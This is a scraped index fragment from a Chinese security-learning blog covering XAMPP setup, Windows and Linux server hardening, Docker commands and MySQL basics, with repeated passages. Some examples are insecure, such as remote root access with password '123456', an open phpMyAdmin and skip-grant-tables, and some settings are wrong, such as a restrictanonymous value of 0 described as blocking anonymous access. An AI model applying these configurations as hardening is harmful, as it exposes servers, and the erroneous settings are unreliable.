数据库，不需要密码。 两种方式修改mysql的密码： 第一种方式： phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin&#x2F;config.inc.php 1$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;654321&#x27;; 第二种方式，默认空密码登陆后 12345678mysql -uroot update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;127.0.0.1&#x27;;update user set authentication_string=password(&#x27;xxxxxx&#x27;) where user=&#x27;root&#x27; and host=&#x27;%&#x27;;flush privileges而不是下面的语句update user set password=&#x27;qwe123&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;; 注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入 1skip-grant-tables 安全起见，一般要禁用phpmyadmin，有三种方法","text":"Lampp环境1、基本概念与环境 Linux+apache2+mysql+php+python Xmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。 Xmapp 启动后，Apache 使用端口80，防火墙要放行 1firewall-cmd --add-port=80/tcp --permanant http://ip/dashboard/phpinfo.php 展示了所有运行环境参数，通常情况下，配置完成后要删除该页面 默认情况下，&#x2F;opt&#x2F;lampp&#x2F;htdocs 目录是应用程序的根目录。 phpmyadmin 是mysql的网页端，默认情况下禁止远程访问 123456789# 修改/opt/lampp/etc/extra/httpd-xampp.conf # 注释 Require local 新增 Require all granted 即可运行远程访问# since XAMPP 1.4.3&lt;Directory &quot;/opt/lampp/phpmyadmin&quot;&gt; AllowOverride AuthConfig Limit # Require local Require all granted ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var&lt;/Directory&gt; 确认服务和端口正常启动 修改默认端口，修改配置文件&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf，改成非80，更安全 如果出现内核版本不兼容情况，修改&#x2F;opt&#x2F;lampp&#x2F;lampp ，将内核版本修改为2.8.0以上。 1LD_ASSUME_KERNEL=2.8.0 部署对应的系统或者网站，导入数据库，修改配置文件等。 注意配置数据库时 修改root默认密码 配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置 123456789101112131415161718默认数据库的user情况MariaDB [mysql]&gt; select User,Password,Host from user;+------+----------+-----------+| User | Password | Host |+------+----------+-----------+| root | | localhost || root | | 127.0.0.1 || root | | ::1 || | | localhost || root | | % || pma | | localhost第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 数据库，不需要密码。 两种方式修改mysql的密码： 第一种方式： phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin&#x2F;config.inc.php 1$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;654321&#x27;; 第二种方式，默认空密码登陆后 12345678mysql -uroot update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;127.0.0.1&#x27;;update user set authentication_string=password(&#x27;xxxxxx&#x27;) where user=&#x27;root&#x27; and host=&#x27;%&#x27;;flush privileges而不是下面的语句update user set password=&#x27;qwe123&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;; 注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入 1skip-grant-tables 安全起见，一般要禁用phpmyadmin，有三种方法 1、设置访问密码，更改PhpMyadmin的默认config 模式为cookie模式 123使用cookie授权模式 将&#x27;auth_type&#x27;改为&#x27;cookie&#x27;，然后修改&#x27;blowfish_secret&#x27;用一个任意字符串作为cookie的加密字符串，如果没有加密钥匙,系统会显示&quot;配置文件现在需要绝密的短语密码(blowfish_secret) &quot; ,配置文件如下:$cfg[&#x27;Servers&#x27;][$i][&#x27;auth_type&#x27;] = &#x27;cookie&#x27;; $cfg[&#x27;blowfish_secret&#x27;] = &#x27;44e2f5aece2855.93921574&#x27;; 2、禁用phpMyadmin，在httpd.conf 注释掉http-xmapp.conf的包含目录，删除phpmyadmin 3、管理数据库，使用数据库，phpmyadmin 放在另一个服务器上之类的 4、使用knock 进行端口隐藏，使用时再打开 其他注意事项 1、任何一个URL地址，一定要指定到具体的文件，如果没有指定，访问默认首页 如 httpd.conf 1DirectoryIndex index.html index.html.var index.php index.php3 index.php4 默认下，任何一个目录，如果只输入目录名而不输入文件名去访问，该目录必须要有一个默认主文件，比如index.html。index.php ，index.jsp default.php main.php 否则将无法访问到该页面，不然就是明显的安全漏洞，如目录浏览 2、为了防止目录浏览，还可以修改httpd.conf ，修改options 12Options Indexes FollowSymLinks ExecCGI Includes改成Options None","categories":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/tags/web/"}]},{"title":"windows 服务器加固技术","slug":"windows 服务器加固技术_new","date":"2023-06-10T16:00:00.000Z","updated":"2023-07-22T02:53:56.596Z","comments":true,"path":"2023/06/11/windows 服务器加固技术_new/","link":"","permalink":"http://zwjsfdbb.top/2023/06/11/windows%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF_new/","excerpt":"Windows 服务器加固技术1、windows 常用命令 命令 说明 ver 查看系统版本 hostname 查看主机名 ipconfig &#x2F;all 查看网络配置 net user&#x2F;localgroup&#x2F;share&#x2F;config 查看用户&#x2F;用户组&#x2F;共享&#x2F;当前运行可配置服务 at 建立或查看系统作业 netstat 查看开放端口 secpol.msc 查看和修改本地安全设置 services.msc 查看和修改服务 eventvwr.msc 查看日志 regedit 打开注册表 whoami 查看当前操作用户的用户名 修改本地安全策略 账户策略 密码策略 账户锁定策略 本地策略 审核策略 -记录成日志 用户权限分配 安全选项 2、windows 常见端口 端口 说明 80&#x2F;8080&#x2F;8081 HTTP协议代理服务器常用端口号 443 HTTPS协议代理服务器常用端口号 21 FTP(文件传输协议)协议代理服务器常用端口号 23 Telnet(远程登录)协议代理服务器常用端口号 22 SSH（安全登录）、SCP（文件传输） 1521 Oracle 数据库 1433 MS SQL SERVER数据库 1080 QQ 3306 Mysql数据库 25 SMTP（简单邮件传输协议） 3、windows账号及安全策略 windows+R secpol.msc 账号策略 1234密码必须符合复杂性要求：启用 密码长度最小值 8个字符 密码最长使用期限： 30天 强制密码历史： 3个记住的密码","text":"Windows 服务器加固技术1、windows 常用命令 命令 说明 ver 查看系统版本 hostname 查看主机名 ipconfig &#x2F;all 查看网络配置 net user&#x2F;localgroup&#x2F;share&#x2F;config 查看用户&#x2F;用户组&#x2F;共享&#x2F;当前运行可配置服务 at 建立或查看系统作业 netstat 查看开放端口 secpol.msc 查看和修改本地安全设置 services.msc 查看和修改服务 eventvwr.msc 查看日志 regedit 打开注册表 whoami 查看当前操作用户的用户名 修改本地安全策略 账户策略 密码策略 账户锁定策略 本地策略 审核策略 -记录成日志 用户权限分配 安全选项 2、windows 常见端口 端口 说明 80&#x2F;8080&#x2F;8081 HTTP协议代理服务器常用端口号 443 HTTPS协议代理服务器常用端口号 21 FTP(文件传输协议)协议代理服务器常用端口号 23 Telnet(远程登录)协议代理服务器常用端口号 22 SSH（安全登录）、SCP（文件传输） 1521 Oracle 数据库 1433 MS SQL SERVER数据库 1080 QQ 3306 Mysql数据库 25 SMTP（简单邮件传输协议） 3、windows账号及安全策略 windows+R secpol.msc 账号策略 1234密码必须符合复杂性要求：启用 密码长度最小值 8个字符 密码最长使用期限： 30天 强制密码历史： 3个记住的密码 账号锁定 123帐户锁定阀值： 3次无效登陆帐户锁定时间： 30分钟 复位帐户锁定计数器：30分钟之后 Administrator账号 组重命名 Win + R 键，然后输入 compmgmt.msc 命令打开计算机管理 1wmic useraccount where name=&#x27;Administor&#x27; call Rename admin 禁用Guest账户 4、日志以及审核策略 windows+R secpol.msc 本地策略-&gt;审核策略 12345678审核策略更改 成功，失败 审核登陆事件 成功，失败审核对象访问 失败 审核目录服务访问 失败 审核特权使用 失败 审核系统事件 成功，失败 审核账户登陆事件 成功，失败 审核帐户管理 成功，失败 更改日志大小 eventvwr.msc 1234日志类型 日志大小 覆盖策略应用程序 80000KB 覆盖早于30天的日志安全日志 80000KB 覆盖早于30天的日志系统日志 80000KB 覆盖早于30天的日志 5、安全选项本地安全策略-&gt;本地策略-&gt;安全选项 Microsoft 网络服务器：当登录时间用完时自动注销用户（启用） 目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录 Microsoft 网络服务器：在挂起会话之前所需的空闲时间（小于等于30分钟） 目的：设置挂起会话之前所需的空闲时间为30分钟 Microsoft 网络客户端：发送未加密的密码到第三方SMB服务器（禁用） 目的：禁止发送未加密的密码到第三方SMB服务器 故障恢复控制台:允许对所有驱动器和文件夹进行软盘复制和访问（禁用） 目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上 故障恢复控 制台:允许自动系统管理级登录（禁用） 目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统 关机：清除虚拟内存页面文件（启用） 目的：某些第三方的程序可能把一些没有的加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏 关机：允许系统在未登录前关机（禁用） 目的：在未登录前不能关闭计算机 交互式登录：不显示上次的用户名（启用） 目的：登陆时不显示上次的用户名，防止暴露用户名。 交互式登录：不需要按Ctrl+Alt+Del（禁用） 目的：登录时需要按CTRL+ALT+DEL 交互式登录：可被缓存的前次登录个数（设置缓存数为0，此项对域服务器无效。） 目的：登陆时不显示上次的用户名，防止暴露用户名 网络访问：不允许为网络身份验证储存凭证或 .NET passports(启用） 审核：如果无法记录安全审核则立即关闭系统 （启用） 审核：对全局系统对象的访问进行审核（启用） 网络访问：本地账户的共享和安全模式：仅来宾–本地账户以来宾用户身份验证 网络访问：可匿名访问的共享（全部删除） 网络访问：可匿名访问的命名管道 （全部删除） 网络访问：可远程访问的注册表路径（全部删除） 网络访问：可远程访问的注册表路径和子路径 （全部删除） 用户权限策略设置 通过终端服务拒绝登陆”中加入Guests、User组 “通过终端服务允许登陆”中只加入Administrators组 “从网络访问此计算机”中删除PowerUsers和BackupOperators “拒绝本地登录”中添加web和guest用户 6、NTFS安全Windows权限的继承性、累加性、优先性、交叉性四项基本原则 Windows NT以后的文件，及文件夹共享设置有以下特性：继承性、累加性、优先性、交叉性。 继承性：下级的目录在没有经过重新设置之前，是拥有上一级目录权限设置的。 累加性：是说如一个组GROUP1中有两个用户USER1、USER2，他们同时对某文件或目录的访问权限分别为“读取”和“写入”，那么组GROUP1对该文件或目录的访问权限就为USER1和USER2的访问权限之和。 优先性：权限的这一特性又包含两种子特性，其一是文件的访问权限优先目录的权限，也就是说文件权限可以越过目录的权限，不顾上一级文件夹的设置。另一特性就是“拒绝”权限优先其它权限，也就是说“拒绝”权限可以越过其它所有其它权限，一旦选择了“拒绝”权限，则其它权限也就不能取任何作用，相当于没有设置。 交叉性：指当同一文件夹在为某一用户设置了共享权限的同时又为用户设置了该文件夹的访问权限，且所设权限不一致时，它的取舍原则是取两个权限的交集，也即最严格、最小的那种权限。如目录A为用户USER1设置的共享权限为“只读”，同时目录A为用户USER1设置的访问权限为“完全控制”，那用户USER1的最终访问权限为“只读”。 12345678系统分区C盘 administrator、system完全控制C:\\Documents and Settings\\ administrator、system完全控制C:\\windows\\system32\\ administrator读写C:\\progran files 为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制C:\\windows 系统管理员完全控制、system拒绝(继承)C:\\windows\\system32 其关键程序只允许administrator完全控制C:\\Inetpub\\ administrator、system完全控制，必要时可以删除该目录网站目录所在磁盘 administrator、system完全控制 7、注册表安全设置12345HKEY_LOCAL_MACHINE 包含关于本地计算机系统的信息，包括硬件和操作系统数据。HKEY_LOCAL_ROOT 包含各种OLE技术使用的信息技术和文件类别关联数据HKEY_LOCAL_USER 包含环境变量、桌面设置、网络连接、打印机和程序首选项。HKEY_LOCAL_USERS 包含关于动态加载的用户配置文件和默认的配置文件的信息，有些信息和HKEY_CURRENT_USER交叉出现HKEY_CURRENT_CONFIG 包含在启动时由本地计算机系统使用的硬件配置文件的相关信息。 禁止自动登录 12reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v AutoAdminLogon /d 0 /f 启用源路由欺骗保护 1reg add &quot; System\\CurrentControlSet\\ Services\\Tcpip\\Parameters\\ &quot; /v DisableIPSourceRouting /t REG_DWORD /d 2 /f 禁止空链接 12reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v restrictanonymous /d 0 /f 删除系统默认共享 123456#查看默认共享net share#删除默认共享net share &lt;共享名&gt; /del# 默认共享 在其他主机输入IP，用户名和密码可访问共享 修改默认3389远程端口 12reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp&quot; /v PortNumber /d 4445 /f 关闭135.139.445隐患端口 12345防火墙-&gt;新建规则-&gt;端口-&gt;阻止连接135 RPC服务139 局域网文件和打印机共享协议445 SMB协议的文件共享","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Linux系统安全配置","slug":"Linux系统安全配置","date":"2023-06-03T16:00:00.000Z","updated":"2023-07-27T14:28:27.429Z","comments":true,"path":"2023/06/04/Linux系统安全配置/","link":"","permalink":"http://zwjsfdbb.top/2023/06/04/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/","excerpt":"Linux系统安全配置系统权限1、安装操作系统1、选择稳定版操作系统 2、最小化安装（后期方便安装应用） 3、不要安装gcc ，make（防止黑客进入以后方便操作） 4、安装系统后更新系统 1yum -y update 2、文件权限 文件夹默认权限 755 777-022 文件默认权限 644 666-022","text":"Linux系统安全配置系统权限1、安装操作系统1、选择稳定版操作系统 2、最小化安装（后期方便安装应用） 3、不要安装gcc ，make（防止黑客进入以后方便操作） 4、安装系统后更新系统 1yum -y update 2、文件权限 文件夹默认权限 755 777-022 文件默认权限 644 666-022 ​ &#x2F;root 550 ​ &#x2F;etc&#x2F;passwd 644 ​ &#x2F;etc&#x2F;shadow 000 冒险位是什么 当一个二进制可执行文件被分配了 SUID 标志位后，该程序就可以以该文件所有者的身份来运行，即使它被其他用户执行。通常情况下，只有一些特定的二进制可执行文件需要使用 setuid 来工作。 本身普通用户jack 不用 less &#x2F;etc&#x2F;shadow 查看 给less加了冒险位以后，less 以该文件所有者的身份运行，从而可以查看&#x2F;etc&#x2F;shadow。 sgid强制位是什么 对目录生效，在此目录创建文件自动归入目录所在组 1chmod 2777 dirname 如下图所示，xxx目录被设置了强制位，那么即便root用户在该目录创建了一个文件，但是其所属组仍然是jack sticky粘制位是什么 目录中的文件只能被文件拥有者删除 1chmod 1777 dirname 文件ACL getfack setfacl 设置了acl的有+ 1234567# 设置acl权限setfacl -m -u:usename:权限 filename # 查看acl权限getfacl filename# 删除acl权限setfacl -x -u:usename filenamesetfacl -b filename 文件属性chattr lsattr1234567891011121314151617181920212223242526272829chattr +a filename 文件只能追加不能删除lsattr filename 查看文件属性chattr -a filename 减去追加权限chattr +i filename 不允许改变也不运行删除示例 让黑客不能添加用户，可以通过修改passwd文件来chattr +i /etc/passwd 不允许修改，也不允许删除，然后隐藏chattr命令，mv +rename 示例 2 find /bin /sbin /usr/bin /usr/sbin /etc/passwd /etc/shadow /etc/pam.d -type -f -exec chattr +i &#123;&#125; \\;示例3 日志文件防止删除chattr +a /var/log/messages /var/log/secure如果有日志轮转的话vim /etc/logrotate.d/syslogprerotate chattr -a /var/log/messagesendscript......prerotate chattr +a /var/log/messagesendscript 3、用户授权 su 123# 切换到用户jack 并同时切到用户目录su - jack # 而不是su jack（在当前目录切换） sudo 1234567891011121314# 修改用户visudo = vim /etc/sudoers修改语法如下：jack ALL=NOPASSWD: /usr/sbin/ip,/usr/sbin/fdisk,/usr/bin/less# 修改用户组groupadd smartgouseradd it01 -G smartgo%smartgo ALL=NOPASSWD: /usr/sbin/ip%smartgo ALL=NOPASSWD: /usr/sbin/useradd, /user/sbin/userdel,/bin/passwd%smartgo ALL=NOPASSWD: !/usr/bin/rm%smartgo ALL=NOPASSWD: !/bin/passwd root, !/bin/passwd root --stdin, !/bin/passwd --stdin root sudo 日志 123cat /etc/rsyslog.conf |grep &#x27;^authprivauthpriv.* /var/log/secure 4、用户认证 PAM认证 gdm 认证、kdm 认证 su 认证 ssh 认证 ftp samba 自带数据库验证方式 Mysql Web验证方式 （httppasswd） PAM (Pluggable Authentication Modules) 可拔插认证式模块。 四种认证类型 auth 认证管理 验证使用者身份，账户和密码 account 用户管理 基于用户时间或者密码有限期来决定是否允许访问 password 密码（口令）认证管理 禁止用户反复尝试登陆，在变更密码时进行密码复杂性控制 session 会话管理 进行日志记录，或者限制用户登陆的次数，资源限制 流程标记 1234567891011Required (必要条件) 验证失败，仍然继续，最后仍然返回FailRequisite （必要条件） 验证失败立即结束Sufficient （充分条件） 验证成功立即返回，否则忽略结果继续Optional （可选条件） 结果不影响Include 包含另外一个配置条件相同的行Substack 垂直叠加 PAM 常用模块 pam_rootok.so &#x2F;etc&#x2F;pam.d&#x2F;su 示例 限制root 切换到其他用户也需要密码 1234567[root@192 ~]# cat /etc/pam.d/su#%PAM-1.0auth sufficient pam_rootok.so 这一行注释了就代表从root 切换到其他用户也需要密码[root@192 ~]# cat /etc/pam.d/su#%PAM-1.0auth sufficient pam_rootok.so pam.access.so 123456789101112131415161718访问控制，配置文件 修改 /etc/pam.d/sshd新增Auth required pam.access.so修改 /etc/security/access.conf# 例如 限制用户从哪些网段登录# -代表deny 后面跟用户 +地址-:root:192.168.2.30 +:root:192.168.2.0/24 EXCEPT 192.168.2.1 pam_time.so 12345678基于时间的访问控制，默认配置文件在 /etc/security/time.confgrep time /etc/pam.d/sshdaccount required pam_time.so # 新增的内容# 修改 /etc/security/time.conf 实现基于时间的控制 pam_tally2.so 功能：登录统计 1234567grep tally /etc/pam.d/sshdauth required pam_tally2.so deny=3 even_deny_root root_unlock_time=60 unlock_time=60# 查看被锁了多少次pam_tally2 -u# 清空计数pam_tally2 --reset -u root pam 资源限制 对用户进行系统资源使用限制 pam_limits.so 功能：限制用户会话过程中对各种资源的使用情况 &#x2F;etc&#x2F;security&#x2F;limits.conf &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;*.conf 12# domain type item valuejack soft nofile 10240 # 设置jack 用户最大打开文件数10240个 Cgroup 对资源进行限制 123456789101112131415161718192021yum -y install libcgroupsystemctl enable cgconfigsystemctl start cgconfigman cgconfig.confvim /etc/cgconfig.confgroup lesscpu &#123; cpu&#123; cpu.shares=200(ms); &#125;&#125;group morecpu &#123; cpu&#123; cpu.shares=800(ms); &#125;&#125;cgexec -g cpu:lesscpu sha1sum /dev/zerocgexec -g cpu:morecpu md5sum /dev/zero可以看到以上两个进程的CPU 占比大概是1：4 的样子 1","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Docker","slug":"Docker_new","date":"2023-04-23T16:00:00.000Z","updated":"2023-07-22T02:53:56.581Z","comments":true,"path":"2023/04/24/Docker_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/24/Docker_new/","excerpt":"Docker–常用操作命令1、对比虚拟机 安装虚拟机软件，安装操作系统，备份虚拟机文件，随时复制并启动 在Linux 安装Docker应用程序，从镜像仓库拉取操作系统或者应用环境，基于该镜像文件创建一个容器（运行环境），备份容器以供下次使用，或者将容器提交为本地镜像 虚拟机模拟一套全新的硬件环境，而Docker 则是直接使用宿主机资源 2、安装 123456789yum install net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum -y install docker-cesystemctl start dockerdocker infosystemctl list-unit-filessystemctl list-unit-files |grep docker 2、docker命令 12345678910111213141516docker ps # 查看当前运行的容器docker images # 列举当前的镜像docker search centos # 查找镜像docker pull hello-world # 拉取镜像docker create hello-world # 创建容器[root@192 ~]# docker create --name your_docker_name hello-world56ca1631d20a8e016f47545e0d0d65c253709629000ade70571c34bc54cfc2c8docker container ls -a # 查看所有的容器[root@192 ~]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES56ca1631d20a hello-world &quot;/hello&quot; 44 seconds ago Created vibrant_kalamdocker run --name your_docker_name hello-world # 创建并启动容器 相关网址： https://hub.daocloud.io/","text":"Docker–常用操作命令1、对比虚拟机 安装虚拟机软件，安装操作系统，备份虚拟机文件，随时复制并启动 在Linux 安装Docker应用程序，从镜像仓库拉取操作系统或者应用环境，基于该镜像文件创建一个容器（运行环境），备份容器以供下次使用，或者将容器提交为本地镜像 虚拟机模拟一套全新的硬件环境，而Docker 则是直接使用宿主机资源 2、安装 123456789yum install net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum -y install docker-cesystemctl start dockerdocker infosystemctl list-unit-filessystemctl list-unit-files |grep docker 2、docker命令 12345678910111213141516docker ps # 查看当前运行的容器docker images # 列举当前的镜像docker search centos # 查找镜像docker pull hello-world # 拉取镜像docker create hello-world # 创建容器[root@192 ~]# docker create --name your_docker_name hello-world56ca1631d20a8e016f47545e0d0d65c253709629000ade70571c34bc54cfc2c8docker container ls -a # 查看所有的容器[root@192 ~]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES56ca1631d20a hello-world &quot;/hello&quot; 44 seconds ago Created vibrant_kalamdocker run --name your_docker_name hello-world # 创建并启动容器 相关网址： https://hub.daocloud.io/","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"数据库学习","slug":"数据库学习_new","date":"2023-04-23T16:00:00.000Z","updated":"2023-07-27T14:04:42.179Z","comments":true,"path":"2023/04/24/数据库学习_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0_new/","excerpt":"1、分类 非关系数据库：Memcached&#x2F;Redis 缓存服务器，将数据保存到内存中以提高访问效率 关系数据库：Mysql 2、MYSQL数据库常用操作 增删查改 1234567891011121314create database school character set &#x27;utf8mb4&#x27;; #创建数据库create table student (id int,sid varchar(15),sname varchar(15),sphone char(11),ssec char(1),sage tinyint,create_time datetime); # 创建表show columns from student; # 查看表的结构desc student; # 查看表的结构INSERT INTO student(sid,name,phone,sex,age,degree,college.createtime) values (xx) # 插入数据# 插入多条数据以;结尾# 删除数据-清空TRUNCATE TABLE student;DELETE FROM student;DELETE FROM student where sid=&#x27;&#x27;; # 删除特定数据，通过where 指定条件# 更新数据UPDATE student SET sname=&#x27;xxx&#x27;; # 也可以加where 条件 Navicat 始终无法连接 解决办法 # 放行3306 ，最大可能就是这个原因 firewall-cmd --permanent --zone=public --add-port=3306/tcp firewall-cmd --reload 12345- ``` # 给权限允许外部连接 GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges; # 设置密码，允许连接 update user set host=&#39;%&#39; where user=&#39;root&#39;; set password =password(&#39;123456&#39;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758- 约束 - 主键约束 - 外键结束 - 唯一约束 - 查询语句```powershell# 利用子查询SELECT * FROM student WHERE age=(SELECT MAX(age) FROM student));# like模糊查询 %代替任意多个字符 _代替一个字符SELECT * FROM WHERE sname like &#x27;李%&#x27;# 统计某个列的总和、平均数SELECt SUM(age) From student;SELECt AVG(age) From student;# 查询C10课程排名前5的学生SELECT * FROM grade where courseid=&#x27;c10&#x27; order by score DESC limit 5;# 保存并列SELECT * FROM grade where courseid=&#x27;c10&#x27; and grade in (SELECT grade FROM grade where courseid=&#x27;c10&#x27; order by DESC limit 5);# 分组查询 GROUP BY 自动去重 SELECT coursed,AVG(score) FROM grade GROUP BY courseid;# 如果要对GROUP BY 以后的聚合函数运算出来的结果进行过滤，使用HAVING, WHERE 必须在GROUP by 之前SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid HAVING AvgScore &gt;70&#x27;;对的SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid WHERE AvgScore &gt;70&#x27;;错误SELECT coursed,AVG(score) AS AvgScore FROM grade WHERE AvgScore &gt;70&#x27; GROUP BY courseid :错误# 子查询的 语句 ANY ALL SELECT age FROM student WHERE age &lt;ANY(SELECT DISTINCT(age) From student WHERE degree=&#x27;xxx&#x27;)# UNION 两条SQL语句的查询结果拼成一个结果集 SELECT xxx 用于一些灵活的东西 SELCT classid.calssname FROM class UNION SELECT &#x27;S04&#x27;,&#x27;网安3班&#x27;# 多表查询SELECT * FROM student ,class where student.studentid = grade.studentid;SELECT * FROM student JOIN class ON student.studentid = grade.studentid;SELECT * FROM student INNER JOIN class ON student.studentid = grade.studentid;# left join on 和right join on# 视图 可以把一个很复杂的SQL语句创建为视图，从而将查询结果永久的保存在一张类似表的结构中去，并且支持SQL查询# 索引# 用于帮助提升数据库查询性能，避免全表扫描导致速度极慢# 如何判断索引是否成功EXPLAIN SELECT * from customer where phone=&#x27;xxx&#x27;# 利用sql语句写到文件SELECT “xxx ” INTO OUTFILE &#x27;/tmp/xxx&#x27;# 数据库备份mysqldump -h127.0.0.1 -ppassword xxx &gt;xx.sql# 还原数据库mysqldump -h127.0.0.1 -ppassword xxx &lt;xx.sql 主从复制 两台机器进行数据的实时同步。Master,Slave 所有数据以Master为准，Slave 进行实时复制同步&#x3D;&#x3D;》实时备份，读写分离，写数据到Master,读从Salve。 3、Redis 数据库","text":"1、分类 非关系数据库：Memcached&#x2F;Redis 缓存服务器，将数据保存到内存中以提高访问效率 关系数据库：Mysql 2、MYSQL数据库常用操作 增删查改 1234567891011121314create database school character set &#x27;utf8mb4&#x27;; #创建数据库create table student (id int,sid varchar(15),sname varchar(15),sphone char(11),ssec char(1),sage tinyint,create_time datetime); # 创建表show columns from student; # 查看表的结构desc student; # 查看表的结构INSERT INTO student(sid,name,phone,sex,age,degree,college.createtime) values (xx) # 插入数据# 插入多条数据以;结尾# 删除数据-清空TRUNCATE TABLE student;DELETE FROM student;DELETE FROM student where sid=&#x27;&#x27;; # 删除特定数据，通过where 指定条件# 更新数据UPDATE student SET sname=&#x27;xxx&#x27;; # 也可以加where 条件 Navicat 始终无法连接 解决办法 # 放行3306 ，最大可能就是这个原因 firewall-cmd --permanent --zone=public --add-port=3306/tcp firewall-cmd --reload 12345- ``` # 给权限允许外部连接 GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges; # 设置密码，允许连接 update user set host=&#39;%&#39; where user=&#39;root&#39;; set password =password(&#39;123456&#39;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758- 约束 - 主键约束 - 外键结束 - 唯一约束 - 查询语句```powershell# 利用子查询SELECT * FROM student WHERE age=(SELECT MAX(age) FROM student));# like模糊查询 %代替任意多个字符 _代替一个字符SELECT * FROM WHERE sname like &#x27;李%&#x27;# 统计某个列的总和、平均数SELECt SUM(age) From student;SELECt AVG(age) From student;# 查询C10课程排名前5的学生SELECT * FROM grade where courseid=&#x27;c10&#x27; order by score DESC limit 5;# 保存并列SELECT * FROM grade where courseid=&#x27;c10&#x27; and grade in (SELECT grade FROM grade where courseid=&#x27;c10&#x27; order by DESC limit 5);# 分组查询 GROUP BY 自动去重 SELECT coursed,AVG(score) FROM grade GROUP BY courseid;# 如果要对GROUP BY 以后的聚合函数运算出来的结果进行过滤，使用HAVING, WHERE 必须在GROUP by 之前SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid HAVING AvgScore &gt;70&#x27;;对的SELECT 